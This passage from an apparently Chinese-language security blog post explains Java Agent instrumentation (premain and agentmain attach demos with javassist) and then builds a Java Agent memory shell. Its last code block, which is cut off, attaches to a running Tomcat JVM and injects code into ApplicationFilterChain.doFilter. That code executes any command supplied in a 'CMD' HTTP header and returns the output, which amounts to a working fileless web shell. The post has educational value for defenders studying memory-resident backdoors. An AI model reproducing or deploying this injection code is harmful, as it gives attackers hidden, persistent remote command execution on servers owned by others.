Agent，当有新类被JVM加载时，JVM会自动回调调用自定义Transformer类中的transform方法，传入该类的transform信息（类名、类加载器、类字节码等），并且可以根据传入的类信息决定是否需要修改类字节码，Java Agent修改完字节码后会将新的类字节码返回给JVM，JVM验证类和相应的修改是否合法，当符合类加载要求时，JVM会加载修改后的类字节码。</p><p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713618829182-838aab21-7859-4114-8316-34534f5a9612.png" alt="image.png"></p><p>Instrumentation接口，提供用于监测运行在JVM中的Java API：</p><ul><li>addTransformer&#x2F;removeTransformer，添加或删除ClassFileTransformer</li><li>getAllLoadedClasses，获取所有JVM加载的类</li><li>redefineClasses，重新定义已经加载类的字节码</li><li>setNativeMethodPrefix，动态设置JNI前缀，可以实现Hook Native方法</li><li>retransformClasses，重新加载已经被JVM加载过的类的字节码</li></ul><p>ClassFileTransformer接口是一个转换类文件的代理接口，可以在获取到Instrumentation对象后通过addTransformer方法添加自定义类文件转换器。</p><p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713620377436-534821e2-d495-49b0-b154-f180abab1881.png" alt="image.png"></p><h4 id="测试示例"><a href="#测试示例" class="headerlink" title="测试示例"></a>测试示例</h4><ul><li>创建Test测试类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String output;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">(String output)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.output = output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Print</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Test Class, output is &quot;</span> + output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>(<span class="string">&quot;H3rmesk1r&quot;</span>);</span><br><span class="line">        System.out.println(JSON.toJSON(test));</span><br><span class="line">        System.out.println(test.Print());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>创建MySelfAgent类，重写premain方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySelfAgent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MySelfAgent start...&quot;</span>);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">MySelfTransformer</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>创建MySelfTransformer类，重写transform方法，利用javassist对Test类进行修改</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySelfTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className.equals(<span class="string">&quot;Test&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                classPool.appendClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(loader));</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(classfileBuffer), <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 增加一个String类型的属性input</span></span><br><span class="line">                <span class="type">CtField</span> <span class="variable">ctField</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(classPool.get(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;input&quot;</span>, ctClass);</span><br><span class="line">                <span class="comment">// 设置属性为private</span></span><br><span class="line">                ctField.setModifiers(Modifier.PRIVATE);</span><br><span class="line">                <span class="comment">// 增加属性到类中, 并设置默认值</span></span><br><span class="line">                ctClass.addField(ctField, CtField.Initializer.constant(<span class="string">&quot;javaagent&quot;</span>));</span><br><span class="line">                <span class="comment">// 增加GET/SET方法</span></span><br><span class="line">                ctClass.addMethod(CtNewMethod.setter(<span class="string">&quot;setInput&quot;</span>, ctField));</span><br><span class="line">                ctClass.addMethod(CtNewMethod.getter(<span class="string">&quot;getInput&quot;</span>, ctField));</span><br><span class="line">                <span class="comment">// 重写Print方法</span></span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">toString</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;Print&quot;</span>);</span><br><span class="line">                toString.setBody(<span class="string">&quot;return \&quot;Test Class, input is \&quot; + input + \&quot;, output is \&quot; + output;&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>配置MANIFEST.MF文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Premain-Class: javaagent.TestAgent</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:/Users/alphag0/Desktop/Code/Java/AgentMemoryShell/out/artifacts/AgentMemoryShell_jar/AgentMemoryShell.jar -jar /Users/alphag0/Desktop/Code/Java/Test/out/artifacts/Test_jar/Test.jar</span><br></pre></td></tr></table></figure><p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713674825207-ccef9d57-2fa2-440b-871a-7081af687b44.png" alt="image.png"></p><h3 id="运行时"><a href="#运行时" class="headerlink" title="运行时"></a>运行时</h3><h4 id="基础概述-1"><a href="#基础概述-1" class="headerlink" title="基础概述"></a>基础概述</h4><p>JDK1.6后，增加了agentmain方法，可以在main方法后执行，此时便可以在程序运行时，利用Agent技术来达成一些目的，运行时Agent技术主要依靠VirtualMachine类和VirtualMachineDescriptor类。</p><p>VirtualMachine类：</p><ul><li>attach，可以通过attach方法传入一个JVM的PID，远程连接到JVM上</li><li>loadAgent，向JVM注册一个代理程序Agent，在该Agent的代理程序中会得到一个Instrumentation实例，该实例可以在class加载前改变class的字节码，也可以在class加载后重新加载，在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理</li><li>detach，解出attach建立的连接</li></ul><p>VirtualMachineDescriptor类是用于描述Java虚拟机的容器类，它封装了一个标识目标虚拟机的标识符，以及一个AttachProvider在尝试连接到虚拟机时应该使用的引用。</p><p>VirtualMachineDescriptor实例通过调用VirtualMachine#list方法创建，返回描述所有已安装Java虚拟机的完整描述符列表attach providers。</p><p>工作原理：VirtualMachine类的attach方法，可以attach到一个运行中的java进程上，之后便可以通过loadAgent方法来将agent的jar包注入到对应的进程，注入后，对应进程会调用agentmain方法。</p><p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713678222311-396fbea3-3a28-40f4-8c03-7245d3551d0b.png" alt="image.png"></p><p>对于已加载的类，需要调用retransformClass函数，然后由redefineClasses函数读取已加载的字节码文件后重新加载指定类的字节码。</p><p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713749172778-13323227-71fd-4db3-8f87-d995c8569929.png" alt="image.png"></p><p>但是使用redefineClasses时存在一些限制：</p><ul><li>继承相同的父类</li><li>实现相同的接口</li><li>字段数和字段名要一致，不支持在重新加载时添加或者删除字段</li><li>新增或删除的方法必须是private static&#x2F;final修饰的</li><li>可以修改方法实现</li></ul><h4 id="测试示例-1"><a href="#测试示例-1" class="headerlink" title="测试示例"></a>测试示例</h4><ul><li>创建测试类Test</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&quot;false&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkFlag</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="string">&quot;true&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (checkFlag()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;running true...&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;running false...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>创建Agent类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttachAgent</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;agentmain...&quot;</span>);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">MyTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class loadedClass : allLoadedClasses) &#123;</span><br><span class="line">            <span class="keyword">if</span> (loadedClass.getName() == <span class="string">&quot;Test&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    inst.retransformClasses(loadedClass);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;running JVM...&quot;</span>);</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; virtualMachineDescriptorList = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor vmd : virtualMachineDescriptorList) &#123;</span><br><span class="line">            System.out.println(vmd.displayName());</span><br><span class="line">            <span class="keyword">if</span> (vmd.displayName().equals(<span class="string">&quot;Test&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/AgentMemoryShell/out/artifacts/AgentMemoryShell_jar/AgentMemoryShell.jar&quot;</span>);</span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className.equals(<span class="string">&quot;Test&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                classPool.appendClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(loader));</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(classfileBuffer), <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 由于要保持字段数不变, 无法增加新字段, 重写checkFlag方法</span></span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">checkFlag</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;checkFlag&quot;</span>);</span><br><span class="line">                checkFlag.setBody(<span class="string">&quot;&#123;System.out.println(\&quot;Attach successfully...\&quot;);return true;&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>配置MANIFEST.MF文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Agent-Class: vm.AttachAgent</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713750379102-886c7ab5-3604-456f-86ca-3218aef5231c.png" alt="image.png"></p><h2 id="Java-Agent内存马"><a href="#Java-Agent内存马" class="headerlink" title="Java Agent内存马"></a>Java Agent内存马</h2><p>根据Java Agent的实现原理，Agent内存马实现的思路就是找一个比较通用的类，保证每一次request请求都能调用到它的某一个方法, 然后利用javaassist插入恶意Java代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatAgent</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Agentmain...&quot;</span>);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TomcatTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class loadedClass : allLoadedClasses) &#123;</span><br><span class="line">            <span class="keyword">if</span> (loadedClass.getName().equals(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    inst.retransformClasses(loadedClass);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Running JVM...&quot;</span>);</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; virtualMachineDescriptorList = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor vmd : virtualMachineDescriptorList) &#123;</span><br><span class="line">            System.out.println(vmd.displayName());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (vmd.displayName().contains(<span class="string">&quot;org.apache.catalina.startup.Bootstrap&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/AgentMemoryShell/out/artifacts/AgentMemoryShell_jar/AgentMemoryShell.jar&quot;</span>);</span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">                System.out.println(<span class="string">&quot;Attach successfully...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TomcatTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">classClassPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);</span><br><span class="line">                classPool.insertClassPath(classClassPath);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">            method.insertBefore(<span class="string">&quot;javax.servlet.http.HttpServletRequest httpServletRequest = (javax.servlet.http.HttpServletRequest) request;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;String cmd = httpServletRequest.getHeader(\&quot;CMD\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    Process process = Runtime.getRuntime().exec(cmd);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    java.io.InputStream input = process.getInputStream();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(input));\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    StringBuilder sb = new StringBuilder();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    String line = null;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    while ((line = br.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        sb.append(line + \&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    br.close();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    input.close();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    response.getOutputStream().print(sb.toString());\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    response.getOutputStream().flush();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    response.getOutputStream().close();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">  